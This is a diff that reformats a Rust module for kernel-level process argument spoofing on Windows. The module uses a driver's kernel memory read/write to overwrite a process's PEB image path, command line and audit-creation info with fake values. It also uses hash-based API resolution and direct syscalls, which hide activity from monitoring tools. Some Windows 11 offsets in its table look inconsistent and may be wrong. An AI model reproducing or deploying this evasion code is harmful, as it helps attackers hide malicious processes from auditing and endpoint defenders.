@@ -138,83 +138,110 @@ struct EprocessOffsets {
 /// for completeness and future-proofing.
 const EPROCESS_OFFSETS: &[(u32, EprocessOffsets)] = &[
     // Windows 10 2004 / 20H2 / 21H1 / 21H2
-    (19041, EprocessOffsets {
-        peb: 0x550,
-        image_file_name: 0x5a8,
-        se_audit_process_creation_info: 0x468,
-        peb_process_parameters: 0x20,
-        params_image_path_name: 0x60,
-        params_command_line: 0x70,
-    }),
-    (19042, EprocessOffsets {
-        peb: 0x550,
-        image_file_name: 0x5a8,
-        se_audit_process_creation_info: 0x468,
-        peb_process_parameters: 0x20,
-        params_image_path_name: 0x60,
-        params_command_line: 0x70,
-    }),
-    (19043, EprocessOffsets {
-        peb: 0x550,
-        image_file_name: 0x5a8,
-        se_audit_process_creation_info: 0x468,
-        peb_process_parameters: 0x20,
-        params_image_path_name: 0x60,
-        params_command_line: 0x70,
-    }),
-    (19044, EprocessOffsets {
-        peb: 0x550,
-        image_file_name: 0x5a8,
-        se_audit_process_creation_info: 0x468,
-        peb_process_parameters: 0x20,
-        params_image_path_name: 0x60,
-        params_command_line: 0x70,
-    }),
+    (
+        19041,
+        EprocessOffsets {
+            peb: 0x550,
+            image_file_name: 0x5a8,
+            se_audit_process_creation_info: 0x468,
+            peb_process_parameters: 0x20,
+            params_image_path_name: 0x60,
+            params_command_line: 0x70,
+        },
+    ),
+    (
+        19042,
+        EprocessOffsets {
+            peb: 0x550,
+            image_file_name: 0x5a8,
+            se_audit_process_creation_info: 0x468,
+            peb_process_parameters: 0x20,
+            params_image_path_name: 0x60,
+            params_command_line: 0x70,
+        },
+    ),
+    (
+        19043,
+        EprocessOffsets {
+            peb: 0x550,
+            image_file_name: 0x5a8,
+            se_audit_process_creation_info: 0x468,
+            peb_process_parameters: 0x20,
+            params_image_path_name: 0x60,
+            params_command_line: 0x70,
+        },
+    ),
+    (
+        19044,
+        EprocessOffsets {
+            peb: 0x550,
+            image_file_name: 0x5a8,
+            se_audit_process_creation_info: 0x468,
+            peb_process_parameters: 0x20,
+            params_image_path_name: 0x60,
+            params_command_line: 0x70,
+        },
+    ),
     // Windows 10 22H2
-    (19045, EprocessOffsets {
-        peb: 0x550,
-        image_file_name: 0x5a8,
-        se_audit_process_creation_info: 0x468,
-        peb_process_parameters: 0x20,
-        params_image_path_name: 0x60,
-        params_command_line: 0x70,
-    }),
+    (
+        19045,
+        EprocessOffsets {
+            peb: 0x550,
+            image_file_name: 0x5a8,
+            se_audit_process_creation_info: 0x468,
+            peb_process_parameters: 0x20,
+            params_image_path_name: 0x60,
+            params_command_line: 0x70,
+        },
+    ),
     // Windows 11 21H2
-    (22000, EprocessOffsets {
-        peb: 0x550,
-        image_file_name: 0x5a8,
-        se_audit_process_creation_info: 0x468,
-        peb_process_parameters: 0x20,
-        params_image_path_name: 0x60,
-        params_command_line: 0x70,
-    }),
+    (
+        22000,
+        EprocessOffsets {
+            peb: 0x550,
+            image_file_name: 0x5a8,
+            se_audit_process_creation_info: 0x468,
+            peb_process_parameters: 0x20,
+            params_image_path_name: 0x60,
+            params_command_line: 0x70,
+        },
+    ),
     // Windows 11 22H2
-    (22621, EprocessOffsets {
-        peb: 0x440,
-        image_file_name: 0x098,  // Corrected: _EPROCESS.ImageFileName
-        se_audit_process_creation_info: 0x468,
-        peb_process_parameters: 0x20,
-        params_image_path_name: 0x60,
-        params_command_line: 0x70,
-    }),
+    (
+        22621,
+        EprocessOffsets {
+            peb: 0x440,
+            image_file_name: 0x098, // Corrected: _EPROCESS.ImageFileName
+            se_audit_process_creation_info: 0x468,
+            peb_process_parameters: 0x20,
+            params_image_path_name: 0x60,
+            params_command_line: 0x70,
+        },
+    ),
     // Windows 11 23H2
-    (22631, EprocessOffsets {
-        peb: 0x440,
-        image_file_name: 0x098,
-        se_audit_process_creation_info: 0x468,
-        peb_process_parameters: 0x20,
-        params_image_path_name: 0x60,
-        params_command_line: 0x70,
-    }),
+    (
+        22631,
+        EprocessOffsets {
+            peb: 0x440,
+            image_file_name: 0x098,
+            se_audit_process_creation_info: 0x468,
+            peb_process_parameters: 0x20,
+            params_image_path_name: 0x60,
+            params_command_line: 0x70,
+        },
+    ),
     // Windows 11 24H2
-    (26100, EprocessOffsets {
-        peb: 0x440,
-        image_file_name: 0x098,
-        se_audit_process_creation_info: 0x468,
-        peb_process_parameters: 0x20,
-        params_image_path_name: 0x60,
-        params_command_line: 0x70,
-    }),
+    (
+        26100,
+        EprocessOffsets {
+            peb: 0x440,
+            image_file_name: 0x098,
+            se_audit_process_creation_info: 0x468,
+            peb_process_parameters: 0x20,
+            params_image_path_name: 0x60,
+            params_command_line: 0x70,
+        },
+    ),
 ];
 
 /// Look up the offset table for the current Windows build.
@@ -303,7 +330,9 @@ unsafe fn kv_write_u64_verified(
     if readback != value {
         bail!(
             "Kernel write verification failed at 0x{:016X}: wrote 0x{:016X}, read back 0x{:016X}",
-            addr, value, readback
+            addr,
+            value,
+            readback
         );
     }
     Ok(())
@@ -445,9 +474,8 @@ fn resolve_eprocess_for_pid(target_pid: u32) -> Result<u64> {
             bail!("Buffer overrun while walking SystemProcessInformation");
         }
 
-        let entry = unsafe {
-            &*(buffer.as_ptr().add(offset) as *const SystemProcessInformationEntry)
-        };
+        let entry =
+            unsafe { &*(buffer.as_ptr().add(offset) as *const SystemProcessInformationEntry) };
 
         if entry.unique_process_id as u32 == target_pid {
             let eprocess = entry.unique_process_key as u64;
@@ -689,31 +717,19 @@ impl KernelArgSpoofer {
         // by reusing the existing structure's memory when possible.
 
         // Read existing ImagePathName UNICODE_STRING from RTL_USER_PROCESS_PARAMETERS.
-        let existing_path = unsafe {
-            self.read_unicode_string(
-                params_ptr + o.params_image_path_name as u64,
-            )
-        }
-        .context("failed to read existing ImagePathName")?;
+        let existing_path =
+            unsafe { self.read_unicode_string(params_ptr + o.params_image_path_name as u64) }
+                .context("failed to read existing ImagePathName")?;
 
-        let existing_cmd = unsafe {
-            self.read_unicode_string(
-                params_ptr + o.params_command_line as u64,
-            )
-        }
-        .context("failed to read existing CommandLine")?;
+        let existing_cmd =
+            unsafe { self.read_unicode_string(params_ptr + o.params_command_line as u64) }
+                .context("failed to read existing CommandLine")?;
 
         // Determine where to write the new string data.
         // Try to reuse existing buffers if they're large enough.
-        let path_alloc = self.allocate_string_buffer(
-            &existing_path,
-            fake_path_utf16.len(),
-        )?;
+        let path_alloc = self.allocate_string_buffer(&existing_path, fake_path_utf16.len())?;
 
-        let cmd_alloc = self.allocate_string_buffer(
-            &existing_cmd,
-            fake_args_utf16.len(),
-        )?;
+        let cmd_alloc = self.allocate_string_buffer(&existing_cmd, fake_args_utf16.len())?;
 
         // Write the fake path string.
         unsafe {
@@ -797,10 +813,8 @@ impl KernelArgSpoofer {
                 maximum_length: fake_path_utf16.len() as u16,
                 buffer: path_alloc.address,
             };
-            unsafe {
-                self.write_unicode_string_verified(audit_info_ptr, &audit_us)
-            }
-            .context("failed to update SeAuditProcessCreationInfo ImageFileName")?;
+            unsafe { self.write_unicode_string_verified(audit_info_ptr, &audit_us) }
+                .context("failed to update SeAuditProcessCreationInfo ImageFileName")?;
         } else {
             tracing::warn!("SeAuditProcessCreationInfo is NULL — skipping audit info update");
         }
@@ -874,10 +888,9 @@ impl KernelArgSpoofer {
         // To resolve the target's CR3, we read its DirectoryTableBase from
         // its _KPROCESS (embedded at the start of _EPROCESS).
 
-        let dtb_offset = crate::kernel_callback::dtb_offset_for_build(
-            crate::syscalls::get_build_number(),
-        )
-        .context("DTB offset not available for this build")?;
+        let dtb_offset =
+            crate::kernel_callback::dtb_offset_for_build(crate::syscalls::get_build_number())
+                .context("DTB offset not available for this build")?;
 
         let target_cr3 = unsafe {
             kv_read_u64(
@@ -918,10 +931,7 @@ impl KernelArgSpoofer {
         .context("failed to read existing ImagePathName from PEB")?;
 
         let existing_cmd = unsafe {
-            self.read_unicode_string_with_cr3(
-                target_cr3,
-                params_ptr + o.params_command_line as u64,
-            )
+            self.read_unicode_string_with_cr3(target_cr3, params_ptr + o.params_command_line as u64)
         }
         .context("failed to read existing CommandLine from PEB")?;
 
@@ -1006,11 +1016,7 @@ impl KernelArgSpoofer {
     }
 
     /// Read a `UNICODE_STRING` using a specific CR3 (for user-space addresses).
-    unsafe fn read_unicode_string_with_cr3(
-        &self,
-        cr3: u64,
-        addr: u64,
-    ) -> Result<UnicodeString> {
+    unsafe fn read_unicode_string_with_cr3(&self, cr3: u64, addr: u64) -> Result<UnicodeString> {
         let mut buf = [0u8; 16];
         kv_read_with_cr3(self.driver, self.device_handle, cr3, addr, &mut buf)?;
         Ok(UnicodeString {
@@ -1021,11 +1027,7 @@ impl KernelArgSpoofer {
     }
 
     /// Write a `UNICODE_STRING` to kernel virtual memory with verification.
-    unsafe fn write_unicode_string_verified(
-        &self,
-        addr: u64,
-        us: &UnicodeString,
-    ) -> Result<()> {
+    unsafe fn write_unicode_string_verified(&self, addr: u64, us: &UnicodeString) -> Result<()> {
         let mut buf = [0u8; 16];
         buf[0..2].copy_from_slice(&us.length.to_le_bytes());
         buf[2..4].copy_from_slice(&us.maximum_length.to_le_bytes());
@@ -1071,7 +1073,9 @@ impl KernelArgSpoofer {
 
         // If the existing buffer has *some* space, we can try writing
         // just the data without null terminator (risky, but sometimes works).
-        if existing.buffer != 0 && (existing.maximum_length as usize) >= required_len.saturating_sub(2) {
+        if existing.buffer != 0
+            && (existing.maximum_length as usize) >= required_len.saturating_sub(2)
+        {
             // Close enough — write without the null terminator.
             return Ok(PoolAllocation {
                 address: existing.buffer,
@@ -1101,13 +1105,7 @@ impl KernelArgSpoofer {
             // Best effort: zero out the allocation to avoid leaking data.
             let zeros = vec![0u8; *size];
             unsafe {
-                let _ = kv_write(
-                    self.driver,
-                    self.device_handle,
-                    self.cr3,
-                    *addr,
-                    &zeros,
-                );
+                let _ = kv_write(self.driver, self.device_handle, self.cr3, *addr, &zeros);
             }
         }
         self.pool_allocations.clear();
@@ -1241,24 +1239,25 @@ pub fn create_process_with_spoofed_args(
 
     // Step 2: Spoof the arguments at the kernel level.
     let result = {
-        let mut spoofer = KernelArgSpoofer::new()
-            .context("failed to initialize KernelArgSpoofer")?;
+        let mut spoofer =
+            KernelArgSpoofer::new().context("failed to initialize KernelArgSpoofer")?;
         spoofer.spoof_process_args(pid, fake_exe, fake_args)
     };
 
     if let Err(e) = result {
         // Kill the suspended process on failure — it has unspoofed args.
-        tracing::error!("Spoofing failed: {} — terminating suspended process PID={}", e, pid);
-        let _ = unsafe {
-            crate::syscall!("NtTerminateProcess", handle as u64, 1u64)
-        };
+        tracing::error!(
+            "Spoofing failed: {} — terminating suspended process PID={}",
+            e,
+            pid
+        );
+        let _ = unsafe { crate::syscall!("NtTerminateProcess", handle as u64, 1u64) };
         return Err(e).context("kernel argument spoofing failed");
     }
 
     // Step 3: Resume the process.
-    let resume_status = unsafe {
-        crate::syscall!("NtResumeThread", handle as u64, 0u64 as *mut u32 as u64)
-    };
+    let resume_status =
+        unsafe { crate::syscall!("NtResumeThread", handle as u64, 0u64 as *mut u32 as u64) };
     if let Err(e) = resume_status {
         tracing::warn!(
             "NtResumeThread failed for PID={} ({}) — process may be stuck suspended",
@@ -1289,17 +1288,12 @@ fn create_suspended_process(exe_path: &str) -> Result<(u32, usize)> {
     const CREATE_NO_WINDOW: u32 = 0x08000000;
 
     // Resolve kernel32.
-    let k32 = unsafe {
-        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
-    }
-    .context("could not resolve kernel32 base")?;
+    let k32 = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) }
+        .context("could not resolve kernel32 base")?;
 
     // Resolve CreateProcessW.
     let create_process_w = unsafe {
-        pe_resolve::get_proc_address_by_hash(
-            k32,
-            pe_resolve::hash_str(b"CreateProcessW\0"),
-        )
+        pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"CreateProcessW\0"))
     }
     .context("could not resolve CreateProcessW")?;
 
@@ -1316,8 +1310,7 @@ fn create_suspended_process(exe_path: &str) -> Result<(u32, usize)> {
         *mut u8,  // lpProcessInformation
     ) -> i32;
 
-    let create_process: CreateProcessWFn =
-        unsafe { std::mem::transmute(create_process_w) };
+    let create_process: CreateProcessWFn = unsafe { std::mem::transmute(create_process_w) };
 
     // Build the wide command line.
     let wide: Vec<u16> = OsStr::new(exe_path)
@@ -1377,7 +1370,11 @@ mod tests {
         // Every build in the table must be findable by exact match.
         for &(build, _) in EPROCESS_OFFSETS {
             let offsets = offsets_for_build(build);
-            assert!(offsets.is_some(), "build {} should be in offset table", build);
+            assert!(
+                offsets.is_some(),
+                "build {} should be in offset table",
+                build
+            );
         }
 
         // Known-good builds.
@@ -1405,10 +1402,7 @@ mod tests {
     fn test_str_to_utf16le() {
         let result = str_to_utf16le("ABC");
         // A=0x0041, B=0x0042, C=0x0043, null=0x0000
-        assert_eq!(
-            result,
-            &[0x41, 0x00, 0x42, 0x00, 0x43, 0x00, 0x00, 0x00]
-        );
+        assert_eq!(result, &[0x41, 0x00, 0x42, 0x00, 0x43, 0x00, 0x00, 0x00]);
     }
 
     #[test]
